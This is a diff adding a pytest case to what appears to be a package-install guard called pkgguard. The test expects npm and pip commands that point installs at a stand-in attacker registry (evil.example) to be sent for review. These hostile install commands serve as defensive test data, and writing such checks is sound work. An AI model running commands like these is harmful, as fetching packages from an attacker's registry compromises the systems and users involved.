@@ -216,6 +216,20 @@ def test_authorize_rejects_compound_or_embedded_shell(command):
     assert decision.safe_to_execute is False
 
 
+@pytest.mark.parametrize("command", [
+    "npm install --registry=http://evil.example lodash",
+    "npm install --registry http://evil.example lodash",
+    "pip install --index-url https://evil.example/simple requests",
+    "pip install --extra-index-url https://evil.example/simple requests",
+    "pip install --find-links https://evil.example/simple requests",
+    "pip install -i https://evil.example/simple requests",
+])
+def test_authorize_rejects_registry_overrides(command):
+    decision = authorize_command(command)
+    assert decision.decision == "REVIEW"
+    assert decision.safe_to_execute is False
+
+
 def test_authorize_cli_fails_closed_for_review(monkeypatch, capsys):
     monkeypatch.setattr(
         "pkgguard.cli.authorize_command",
